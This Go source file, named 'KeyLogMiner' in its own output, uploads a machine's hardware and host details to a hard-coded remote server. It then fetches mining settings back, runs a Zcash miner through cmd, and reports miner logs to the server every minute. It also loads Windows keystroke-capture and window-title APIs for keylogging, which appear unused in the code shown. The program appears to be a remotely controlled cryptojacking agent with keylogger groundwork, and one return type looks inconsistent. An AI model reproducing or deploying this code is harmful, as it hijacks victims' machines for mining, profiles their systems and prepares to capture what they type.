package main

import (
	//"encoding/json"
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"github.com/BurntSushi/toml"
	"net"
	"github.com/parnurzeal/gorequest"
	"github.com/shirou/gopsutil/mem"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/host"
	"bufio"
	"io"
	"path/filepath"
)

const serverUrl,
apiUploadMachineInfor,
apiUploadMachineStatus = "http://dev.miner.eubchain.com:3001",
	serverUrl + "/machine", serverUrl + "/status"

// Configuration strcution is storing all required configuration data
type Configuration struct {
	ServerURL                 string
	LocalMachineName          string
	DefaultZcashWalletAddress string
	DefaultPoolAddress        string
	DefaultPoolPort           string
	ZcashMinerFlagExtra       string
	ZcashMinerDir             string
	KeyCount                  int
	ProcessID                 int
	TimeOut                   int64
}

type Machine struct {
	MachineName string                `json:"machineName"`
	Disk        mem.VirtualMemoryStat `json:"disk"`
	Cpu         []cpu.InfoStat        `json:"cpu"`
	Host        host.InfoStat         `json:"host"`
}
type MachineConfig struct {
	MachineName               string `json:"machineName"`
	Serverurl                 string `json:"serverurl"`
	Localmachinename          string `json:"localmachinename"`
	Defaultzcashwalletaddress string `json:"defaultzcashwalletaddress"`
	Defaultpooladdress        string `json:"defaultpooladdress"`
	Defaultpoolport           string `json:"defaultpoolport"`
	Zcashminerflagextra       string `json:"zcashminerflagextra"`
	Zcashminerdir             string `json:"zcashminerdir"`
	Keycount                  int    `json:"keycount"`
	Timeout                   int64  `json:"timeout"`
}

type MachineConfigResponse struct {
	Succeed bool          `json:"succeed"`
	Result  MachineConfig `json:"result"`
}

func getMac() net.HardwareAddr {
	interfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println("error", err)
	}
	macAddr := interfaces[0].HardwareAddr
	return macAddr
}

func uploadAndGetMachineConfig() (machineConfig MachineConfig, errR [] error) {
	disk, diskErr := mem.VirtualMemory()
	if diskErr != nil {
		fmt.Println("error", diskErr)
	}
	cpuInfo, cpuErr := cpu.Info()
	if cpuErr != nil {
		fmt.Println("error", cpuErr)
	}
	hostInfo, hostErr := host.Info()
	if hostErr != nil {
		fmt.Println("error", hostErr)
	}

	machine := Machine{
		MachineName: getMac().String(),
		Disk:        *disk,
		Cpu:         cpuInfo,
		Host:        *hostInfo}

	machineConfigResponse := MachineConfigResponse{}
	resp, _, err := gorequest.New().
		Post(apiUploadMachineInfor).
		Send(machine).
		Timeout(time.Duration(5 * time.Second)).
		EndStruct(&machineConfigResponse)
	if err != nil {
		fmt.Println("error:", err)
		return machineConfigResponse.Result, err
	}

	if resp.StatusCode == 200 && machineConfigResponse.Succeed {
		fmt.Println("Upload Machine Information Successful !")
	} else {
		fmt.Println("Upload Machine Information Fail !")
	}
	return machineConfigResponse.Result, nil
}

var (
	// miner process name
	minerprocess = "miner.exe"

	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	// procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //GetForegroundWindow
	procGetWindowTextW = user32.NewProc("GetWindowTextW") //GetWindowTextW

	tmpKeylog string
	tmpTitle  string
)

// ReadConfig reads info from config file
func ReadConfig(configfile string) Configuration {
	fmt.Printf("Config file read: ")
	fmt.Println(configfile)
	var conf Configuration
	if _, err := toml.DecodeFile(configfile, &conf); err != nil {
		fmt.Println("error:", err)
	}
	return conf
}

// SetPID method to set ProcessID
func (f *Configuration) SetPID(pid int) {
	f.ProcessID = pid
}

// RunMiner triggers mining process
// Miner using EWBF's CUDA Zcash miner
// Ref: https://github.com/nanopool/ewbf-miner/releases
func RunMiner(config *Configuration) {

	// fmt.Println("Start RunMiner function")
	if config.LocalMachineName == "" {
		host, err := os.Hostname()
		if err != nil {
			fmt.Printf("%s", err)
		} else {
			config.LocalMachineName = host
		}
	}

	var fullcommand = getCurrentDirectory("/") + "/" + config.ZcashMinerDir + "/" + minerprocess + " --server " + config.DefaultPoolAddress + " --user " + config.DefaultZcashWalletAddress + "." + config.LocalMachineName + " --port " + config.DefaultPoolPort + " " + config.ZcashMinerFlagExtra + " --log 2"
	//fmt.Println(fullcommand)
	// fmt.Print("Process ID = ")
	// fmt.Println(config.ProcessID)
	// fmt.Print("Type of Process ID = ")
	// fmt.Println(reflect.TypeOf(config.ProcessID))
	// Check if process been ran
	if config.ProcessID == 0 {
		c := exec.Command("cmd", "/C", fullcommand)
		if err := c.Run(); err != nil {
			fmt.Println("1 Error: ", err.Error())
		}
		config.SetPID(c.Process.Pid)
		// config.ProcessID = c.Process.Pid
	}
}
func getMinerPid() (pid string, pidErr error) {
	s := "tasklist | findstr miner.exe"
	cmd := exec.Command("cmd", "/C", s)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
		return "", err
	}
	results := strings.Fields(out.String())
	result := strings.Split(fmt.Sprint(results), " ")[1]
	return strings.TrimSpace(result), nil
}

func tailMinerLog() [] string {
	var minerLogs [] string

	inputFile, inputError := os.Open("miner.log")
	if inputError != nil {
		fmt.Printf("An error occurred on opening the inputfile\n")
	}
	defer inputFile.Close()

	inputReader := bufio.NewReader(inputFile)
	for {
		inputString, readerError := inputReader.ReadString('\n')
		minerLogs = append(minerLogs, inputString)
		if readerError == io.EOF {
			return minerLogs
		}
	}
	return minerLogs
}

type MachineStatus struct {
	MachineName string    `json:"machineName"`
	Logs        [] string `json:"logs"`
	Status      bool      `json:"status"`
}
type MachineStatusResponse struct {
	Result  [] string `json:"result"`
	Succeed bool      `json:"succeed"`
}

func minerIsRunning() bool {
	_, err := getMinerPid()
	return err == nil
}
func resetEmptyMinerLog() {
	file, err := os.OpenFile("miner.log", os.O_RDWR|os.O_CREATE, 0766)
	if err != nil {
		fmt.Println("reset miner log fail", file)
	}
	file.WriteString("")
	file.Close()
}
func uploadMachineStatus() {
	for range time.NewTicker(time.Minute * 1).C {
		machineStatus := MachineStatus{getMac().String(), tailMinerLog(), minerIsRunning()}
		machineStatusResponse := MachineStatusResponse{}
		resp, _, err := gorequest.New().
			Post(apiUploadMachineStatus).
			Send(machineStatus).
			Timeout(time.Second * 5).
			EndStruct(&machineStatusResponse)
		if err != nil {
			fmt.Println("error:", err)
		}
		if resp.StatusCode == 200 && machineStatusResponse.Succeed {
			resetEmptyMinerLog()
			fmt.Println("Upload Machine Status Successful !")
		} else {
			fmt.Println("Upload Machine Status Fail !")
		}
	}
}
func getCurrentDirectory(fileOrDir string) string {
	execpath, err := os.Executable() // 获得程序路径
	// handle err ...
	if err != nil {
		fmt.Println("error:", err)
	}
	return filepath.Join(filepath.Dir(execpath), fileOrDir)
}

func main() {
	machineConfig, err := uploadAndGetMachineConfig()
	config := Configuration{}
	if err != nil {
		config = ReadConfig(getCurrentDirectory("./config.toml"))
		config.ProcessID = 0
	} else {
		config = Configuration{
			ServerURL:                 machineConfig.Serverurl,
			LocalMachineName:          machineConfig.Localmachinename,
			DefaultZcashWalletAddress: machineConfig.Defaultzcashwalletaddress,
			DefaultPoolAddress:        machineConfig.Defaultpooladdress,
			DefaultPoolPort:           machineConfig.Defaultpoolport,
			ZcashMinerFlagExtra:       machineConfig.Zcashminerflagextra,
			ZcashMinerDir:             machineConfig.Zcashminerdir,
			KeyCount:                  machineConfig.Keycount,
			TimeOut:                   machineConfig.Timeout,
			ProcessID:                 0}
	}

	fmt.Println("Starting KeyLogMiner!")
	go RunMiner(&config)
	uploadMachineStatus()
}
